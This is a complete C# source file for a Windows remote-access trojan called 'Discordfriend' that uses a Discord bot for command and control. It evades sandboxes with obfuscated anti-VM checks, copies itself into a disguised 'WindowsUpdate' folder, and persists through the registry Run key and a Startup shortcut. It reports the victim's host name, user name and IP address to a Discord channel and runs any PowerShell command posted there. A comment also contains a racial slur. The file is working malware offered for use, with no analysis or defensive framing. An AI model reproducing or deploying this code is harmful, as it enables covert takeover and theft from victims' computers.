using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Text;
using System.Security.Cryptography;
using System.Collections.Generic;
using Discord;
using Discord.WebSocket;

namespace Discordfriend
{
    [ArmDot.Client.VirtualizeCode]
    class Program
    {
        // persistence
        private static string _installedPath;

        private const string PlainToken = null; // plain for testing (enter here and it will gen the encrypted one with pass and shit on next run) (replace null with "token") (currently not showing because debug consol turend off you have to enable)

        // b64 aes cypher
        private const string EncryptedToken = "uHWlaTlwhQgHqlUOjTu0WdLZKDtmyDMy/LqxNIkON7ShiENY30u5CRW+D2O0sDuZgGlGxIfMOi73/EizFsAtMapiRR5K18yjcoaoAlQqBvQ=";

        // pass und so
        private const string AesPassphrase = "Neiki_H0T";
        private const string AesSalt = "Resetti:MY_HE@RT";
        private const int KdfIterations = 100_000;

        private DiscordSocketClient _client;
        private string _channelName;
        private ulong _channelId;
        private string _currentDirectory;

        static void Main(string[] args)
        {
            // Anti nigga
            if (IsRunningInVM())
            {
                Console.WriteLine("VM or Analysis Environment detected. Exiting for safety.");
                Console.ReadLine(); // debug
                return;
            }

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            // Copy
            try
            {
                _installedPath = CopySelfToAppData();
            }
            catch { }

            AddToStartup();
            CreateStartupShortcut();
            new Program().MainAsync().GetAwaiter().GetResult();
        }

        public async Task MainAsync()
        {
            _currentDirectory = Directory.GetCurrentDirectory();
            var config = new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.Guilds | GatewayIntents.GuildMessages | GatewayIntents.MessageContent
            };
            _client = new DiscordSocketClient(config);
            _client.Log += Log;
            _client.Ready += OnReady;
            _client.MessageReceived += OnMessageReceived;

            var token = GetToken();
            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();
            await Task.Delay(-1);
        }

        private string GetToken()
        {
            try
            {
                if (!string.IsNullOrEmpty(PlainToken))
                {
                    // Encrypt and print base64 (enable debug consol for this to work)
                    var blob = EncryptStringToBase64(PlainToken, AesPassphrase, AesSalt, KdfIterations);
                    Console.WriteLine($"[INFO] Encrypted token: {blob}");
                    return PlainToken;
                }

                if (!string.IsNullOrEmpty(EncryptedToken))
                {
                    return DecryptStringFromBase64(EncryptedToken, AesPassphrase, AesSalt, KdfIterations);
                }

                throw new InvalidOperationException("No token provided. Set PlainToken or EncryptedToken.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Error] Token decryption failed: {ex.Message}");
                throw;
            }
        }

        private static string EncryptStringToBase64(string plaintext, string passphrase, string salt, int iterations)
        {
            using (var derive = new Rfc2898DeriveBytes(passphrase, Encoding.UTF8.GetBytes(salt), iterations, HashAlgorithmName.SHA256))
            {
                byte[] key = derive.GetBytes(32);
                byte[] iv = derive.GetBytes(16);
                using (var aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using (var ms = new MemoryStream())
                    using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        byte[] data = Encoding.UTF8.GetBytes(plaintext);
                        cs.Write(data, 0, data.Length);
                        cs.FlushFinalBlock();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
        }

        private static string DecryptStringFromBase64(string base64, string passphrase, string salt, int iterations)
        {
            byte[] cipher = Convert.FromBase64String(base64);
            using (var derive = new Rfc2898DeriveBytes(passphrase, Encoding.UTF8.GetBytes(salt), iterations, HashAlgorithmName.SHA256))
            {
                byte[] key = derive.GetBytes(32);
                byte[] iv = derive.GetBytes(16);
                using (var aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using (var ms = new MemoryStream(cipher))
                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    using (var sr = new StreamReader(cs, Encoding.UTF8))
                    {
                        return sr.ReadToEnd();
                    }
                }
            }
        }

        private static bool IsRunningInVM()
        {
            Console.WriteLine("Starting Anti-VM checks...");

            if (CheckRegistryKeys())
            {
                Console.WriteLine("[!] Detection Triggered: Known Registry Key found.");
                return true;
            }

            if (CheckMacAddress())
            {
                Console.WriteLine("[!] Detection Triggered: Virtual MAC Address found.");
                return true;
            }

            if (CheckProcesses())
            {
                Console.WriteLine("[!] Detection Triggered: Virtualization Process found.");
                return true;
            }

            if (CheckCpuInfo())
            {
                Console.WriteLine("[!] Detection Triggered: Virtual CPU Info found.");
                return true;
            }

            if (CheckHardwareIds())
            {
                Console.WriteLine("[!] Detection Triggered: Virtual Hardware ID found.");
                return true;
            }

            if (CheckSystemDrivers())
            {
                Console.WriteLine("[!] Detection Triggered: Virtual System Driver found.");
                return true;
            }

            if (CheckFileSystemArtifacts())
            {
                Console.WriteLine("[!] Detection Triggered: Virtual File Artifact found.");
                return true;
            }

            if (CheckMemorySize())
            {
                Console.WriteLine("[!] Detection Triggered: Low Memory (RAM).");
                return true;
            }

            if (CheckDiskSize())
            {
                Console.WriteLine("[!] Detection Triggered: Small Hard Drive.");
                return true;
            }

            if (CheckTiming())
            {
                Console.WriteLine("[!] Detection Triggered: CPU Timing Anomaly (Too Slow).");
                return true;
            }

            if (AntiVMBios())
            {
                Console.WriteLine("[!] Detection Triggered: Virtual BIOS signature found.");
                return true;
            }

            if (AntiVMGPU())
            {
                Console.WriteLine("[!] Detection Triggered: Virtual GPU detected.");
                return true;
            }

            Console.WriteLine("Anti-VM checks passed. Starting Bot...");
            return false;
        }

        private static void AddToStartup()
        {
            try
            {
                const string runKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
                using (var key = Registry.CurrentUser.OpenSubKey(runKey, writable: true) ?? Registry.CurrentUser.CreateSubKey(runKey))
                {
                    string exePath = null;
                    try { exePath = Process.GetCurrentProcess().MainModule?.FileName; } catch { }
                    if (string.IsNullOrEmpty(exePath))
                        exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;

                    // Prefer the installed copied path when available
                    string pathToUse = !string.IsNullOrEmpty(_installedPath) && File.Exists(_installedPath) ? _installedPath : exePath;

                    if (!string.IsNullOrEmpty(pathToUse))
                    {
                        key.SetValue("Discordfriend", $"\"{pathToUse}\"");
                    }
                }
            }
            catch { }
        }

        private static void CreateStartupShortcut()
        {
            try
            {
                string exePath = null;
                try { exePath = Process.GetCurrentProcess().MainModule?.FileName; } catch { }
                if (string.IsNullOrEmpty(exePath))
                    exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;

                // Prefer the installed copied path when available
                string pathToUse = !string.IsNullOrEmpty(_installedPath) && File.Exists(_installedPath) ? _installedPath : exePath;

                if (string.IsNullOrEmpty(pathToUse))
                    return;

                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (string.IsNullOrEmpty(startupFolder))
                    return;

                string shortcutPath = Path.Combine(startupFolder, "Discordfriend.lnk");

                Type wshType = Type.GetTypeFromProgID("WScript.Shell");
                if (wshType == null) return;

                dynamic shell = Activator.CreateInstance(wshType);
                dynamic shortcut = shell.CreateShortcut(shortcutPath);
                shortcut.TargetPath = pathToUse;
                shortcut.WorkingDirectory = Path.GetDirectoryName(pathToUse);
                shortcut.WindowStyle = 1;
                shortcut.IconLocation = pathToUse + ",0";
                shortcut.Save();
            }
            catch { }
        }

        private static string CopySelfToAppData()
        {
            string exePath = null;
            try { exePath = Process.GetCurrentProcess().MainModule?.FileName; } catch { }
            if (string.IsNullOrEmpty(exePath))
                exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
                return null;

            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string installDir = Path.Combine(appData, "WindowsUpdate");
                Directory.CreateDirectory(installDir);

                string targetPath = Path.Combine(installDir, Path.GetFileName(exePath));

                // If already running from target, nothing to do
                if (string.Equals(Path.GetFullPath(exePath), Path.GetFullPath(targetPath), StringComparison.OrdinalIgnoreCase))
                    return exePath;

                // Copy executable to target (overwrite if needed)
                File.Copy(exePath, targetPath, overwrite: true);

                return targetPath;
            }
            catch
            {
                return exePath;
            }
        }

        private static bool CheckRegistryKeys()
        {
            try
            {
                string[] vmRegKeys = {
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VBoxService",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VBoxGuest",
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox",
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools",
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware User Process",
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Tools",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmdebug",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmci",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmhgfs",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmmemctl",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmx_svga",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmxnet",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmxnet3",
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\QEMU",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\QEMU",
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\QEMU-GA",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Parallels Tools",
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Parallels",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Xen",
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Citrix\XenTools",
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VirtIO",
                    @"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0\ProcessorNameString"
                };

                foreach (string key in vmRegKeys)
                {
                    if (Registry.GetValue(key, null, null) != null)
                    {
                        Console.WriteLine($"   -> Found Registry Key: {key}");
                        return true;
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckMacAddress()
        {
            try
            {
                string[] vmMacPrefixes = {
                    "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "00:03:FF",
                    "00:1C:42", "00:16:3E", "00:15:5D", "52:54:00", "00:0D:3A"
                };

                using (var mc = new ManagementClass("Win32_NetworkAdapterConfiguration"))
                {
                    foreach (ManagementObject mo in mc.GetInstances())
                    {
                        // check enabled adapters
                        if ((bool)mo["IPEnabled"] == true && mo["MacAddress"] != null)
                        {
                            string mac = mo["MacAddress"].ToString().ToUpper();
                            foreach (string prefix in vmMacPrefixes)
                            {
                                if (mac.StartsWith(prefix.Replace(":", "-")))
                                {
                                    Console.WriteLine($"   -> Found MAC: {mac} (Matches prefix {prefix})");
                                    return true;
                                }
                            }
                        }
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckProcesses()
        {
            try
            {
                string[] vmProcesses = {
                    "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser",
                    "vmware", "vmacthlp", "vmsrvc", "vmusrvc", "prl_cc", "prl_tools",
                    "vmcompute", "vmmem", "vmwp", "qemu-ga", "xenservice", "xsvc"
                };

                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    if (vmProcesses.Any(p => process.ProcessName.ToLower().Contains(p)))
                    {
                        Console.WriteLine($"   -> Found Process: {process.ProcessName}");
                        return true;
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckCpuInfo()
        {
            try
            {
                using (var mc = new ManagementClass("Win32_Processor"))
                {
                    foreach (ManagementObject mo in mc.GetInstances())
                    {
                        string name = mo["Name"].ToString().ToLower();
                        if (name.Contains("virtual") || name.Contains("qemu") || name.Contains("vmware") ||
                            name.Contains("xen") || name.Contains("kvm") || name.Contains("bochs"))
                        {
                            Console.WriteLine($"   -> CPU Name indicates VM: {name}");
                            return true;
                        }
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckHardwareIds()
        {
            try
            {
                using (var mc = new ManagementClass("Win32_ComputerSystemProduct"))
                {
                    foreach (ManagementObject mo in mc.GetInstances())
                    {
                        string uuid = mo["UUID"].ToString();
                        if (uuid.StartsWith("564d") || uuid.Contains("VMware") || uuid.StartsWith("0c0c"))
                        {
                            Console.WriteLine($"   -> UUID indicates VM: {uuid}");
                            return true;
                        }
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckSystemDrivers()
        {
            try
            {
                using (var mc = new ManagementClass("Win32_SystemDriver"))
                {
                    foreach (ManagementObject mo in mc.GetInstances())
                    {
                        if (mo["Name"] != null)
                        {
                            string driverName = mo["Name"].ToString().ToLower();
                            if (driverName.Contains("vbox2313") || driverName.Contains("vmware") ||
                                driverName.Contains("vmmem") || driverName.Contains("xen") || driverName.Contains("prl"))
                            {
                                Console.WriteLine($"   -> Driver found: {driverName}");
                                return true;
                            }
                        }
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckFileSystemArtifacts()
        {
            try
            {
                string[] vmArtifacts = {
                    @"C:\windows\system32\drivers\VBoxMouse.sys",
                    @"C:\windows\system32\drivers\VBoxGuest.sys",
                    @"C:\windows\system32\drivers\vmmouse.sys",
                    @"C:\windows\system32\drivers\vmhgfs.sys"
                };

                foreach (string artifact in vmArtifacts)
                {
                    if (File.Exists(artifact))
                    {
                        Console.WriteLine($"   -> File found: {artifact}");
                        return true;
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckMemorySize()
        {
            try
            {
                using (var mc = new ManagementClass("Win32_ComputerSystem"))
                {
                    foreach (ManagementObject mo in mc.GetInstances())
                    {
                        ulong totalMemory = Convert.ToUInt64(mo["TotalPhysicalMemory"]);
                        // If less than 2GB 
                        if (totalMemory < 2147483648UL)
                        {
                            Console.WriteLine($"   -> RAM is too low: {totalMemory / 1024 / 1024}MB (Limit: 2048MB)");
                            return true;
                        }
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckDiskSize()
        {
            try
            {
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                {
                    // Only check fixed C
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed && drive.Name.Contains("C"))
                    {
                        // If less than 60GB
                        if ((ulong)drive.TotalSize < 64424509440UL)
                        {
                            Console.WriteLine($"   -> Disk {drive.Name} is too small: {drive.TotalSize / 1024 / 1024 / 1024}GB (Limit: 60GB)");
                            return true;
                        }
                    }
                }
                return false;
            }
            catch { return false; }
        }

        private static bool CheckTiming()
        {
            try
            {
                var stopwatch = new Stopwatch();
                stopwatch.Start();
                for (int i = 0; i < 1000000; i++) { Math.Sqrt(i); }
                stopwatch.Stop();

                long elapsed = stopwatch.ElapsedMilliseconds;

                if (elapsed > 500)
                {
                    Console.WriteLine($"   -> Timing check took too long: {elapsed}ms");
                    return true;
                }
                return false;
            }
            catch { return false; }
        }

        private async Task OnReady()
        {
            string ip = null;

            // IP fetching
            using (HttpClient httpClient = new HttpClient())
            {
                httpClient.Timeout = TimeSpan.FromSeconds(5);
                httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");

                string[] ipServices = new[] {
                    "https://checkip.amazonaws.com",
                    "https://api.ipify.org",
                    "https://icanhazip.com"
                };

                foreach (var service in ipServices)
                {
                    try
                    {
                        ip = await httpClient.GetStringAsync(service);
                        ip = ip.Trim();
                        if (!string.IsNullOrWhiteSpace(ip))
                            break;
                    }
                    catch { }
                }
            }

            if (string.IsNullOrWhiteSpace(ip))
            {
                Console.WriteLine("[Warning] Could not fetch IP. Using Machine Name.");
                ip = Environment.MachineName;
            }

            _channelName = ip.Replace(".", "-").Replace(" ", "-").ToLower();
            _channelName = new string(_channelName.Where(c => char.IsLetterOrDigit(c) || c == '-' || c == '_').ToArray());

            Console.WriteLine($"Bot Ready. Target ID: {_channelName}");

            var guild = _client.Guilds.FirstOrDefault();
            if (guild == null) return;

            var existingChannel = guild.TextChannels.FirstOrDefault(x => x.Name == _channelName);
            if (existingChannel == null)
            {
                try
                {
                    var newChannel = await guild.CreateTextChannelAsync(_channelName);
                    _channelId = newChannel.Id;
                    await newChannel.SendMessageAsync($"**Connected!**\n💻 Host: `{Environment.MachineName}`\n👤 User: `{Environment.UserName}`\n🌐 IP/ID: `{ip}`");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Error] Create Channel: {ex.Message}");
                }
            }
            else
            {
                _channelId = existingChannel.Id;
                await existingChannel.SendMessageAsync("**Session Resumed.**");
            }
        }

        private async Task OnMessageReceived(SocketMessage message)
        {
            if (message.Author.IsBot || message.Channel.Id != _channelId) return;

            string command = message.Content;

            if (command.Trim().StartsWith("cd ", StringComparison.OrdinalIgnoreCase))
            {
                string newDir = command.Substring(3).Trim();
                try
                {
                    string target = Path.GetFullPath(Path.Combine(_currentDirectory, newDir));
                    if (Directory.Exists(target))
                    {
                        _currentDirectory = target;
                        await message.Channel.SendMessageAsync($"📂 `{_currentDirectory}`");
                    }
                    else
                    {
                        await message.Channel.SendMessageAsync($"❌ Path not found.");
                    }
                }
                catch (Exception ex)
                {
                    await message.Channel.SendMessageAsync($"Error: {ex.Message}");
                }
                return;
            }

            string output = ExecuteCommand(command);

            if (string.IsNullOrWhiteSpace(output))
            {
                await message.Channel.SendMessageAsync("✅ Executed.");
            }
            else
            {
                if (output.Length > 4000)
                {
                    using (MemoryStream ms = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(output)))
                    {
                        await message.Channel.SendFileAsync(ms, "output.txt", "Output too long for text, attached as file.");
                    }
                }
                else
                {
                    for (int i = 0; i < output.Length; i += 1990)
                    {
                        string chunk = output.Substring(i, Math.Min(1990, output.Length - i));
                        await message.Channel.SendMessageAsync($"```{chunk}```");
                    }
                }
            }
        }

        private string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = _currentDirectory
                };

                using (Process p = Process.Start(psi))
                {
                    string res = p.StandardOutput.ReadToEnd();
                    string err = p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    return string.IsNullOrEmpty(err) ? res : res + "\n[ERROR]: " + err;
                }
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        private Task Log(LogMessage msg)
        {
            Console.WriteLine(msg.ToString());
            return Task.CompletedTask;
        }

        // Neiki anti vm 
        private readonly static List<string> virtualBiosSignatures = new List<string> {
            "lJXY31kV",
            "z80SY9ES",
            "X1kV",
            "0Z2bz9mcjlWT",
            "==gb39mbr5WV",
            "BdkV",
            "=Qnbl1GcvxWZ2VGR",
            "=MHaj9mQ",
            "==AevJEbhVHdylmV",
            "BdkVgQmchRmbhR3U",
            "uVGW",
            "==QVNVUU",
            "u9Wa0FmcvBncvNEI0Z2bz9mcjlWT",
            "zxWZsxWYyFGU",
            "IJWbHByalR3bu5Wa",
            "NZ1S",
            "=UVbvRGINZFS",
            "=AjLw4CM",
            "u9Wa0FmcvBncvNEIlx2YhJ3T"
        };

        private static bool AntiVMBios()
        {
            try
            {
                var searcher = new ManagementObjectSearcher(GetString("T9USC9lMz4WaXBSTPJlRgoCIUNURMV0U"));
                foreach (ManagementObject bios in searcher.Get())
                {
                    string biosName = bios[GetString("==QZtFmT")]?.ToString();
                    string biosManufacturer = bios[GetString("yVmc1R3YhZWduFWT")]?.ToString();
                    string biosVersion = bios[GetString("=42bpNnclZ1UPlkQT9USC10U")]?.ToString();

                    if (biosName != null && biosManufacturer != null && biosVersion != null)
                    {
                        foreach (string signature in virtualBiosSignatures)
                        {
                            if (biosName.IndexOf(GetString(signature), StringComparison.OrdinalIgnoreCase) >= 0 ||
                            biosManufacturer.IndexOf(GetString(signature), StringComparison.OrdinalIgnoreCase) >= 0 ||
                            biosVersion.IndexOf(GetString(signature), StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch
            {
                return true;
            }
            return false;
        }

        private static bool AntiVMGPU()
        {
            try
            {
                var searcher = new ManagementObjectSearcher(GetString("=IXZsx2byRnbvN0blRWaW9lMz4WaXBSTPJlRgoCIUNURMV0U"));
                foreach (ManagementObject gpu in searcher.Get())
                {
                    string gpuName = gpu[GetString("==QZtFmT")]?.ToString();
                    if (gpuName != null)
                    {
                        foreach (string signature in virtualBiosSignatures)
                        {
                            if (gpuName.IndexOf(GetString(signature), StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch
            {
                return true;
            }
            return false;
        }

        private static string GetString(string input)
        {
            try
            {
                byte[] data = Convert.FromBase64String(ReverseString(input));
                return Encoding.UTF8.GetString(data);
            }
            catch
            {
                return input;
            }
        }

        private static string ReverseString(string input)
        {
            char[] charArray = input.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }
        // End morgan/neiki anti vm
    }
}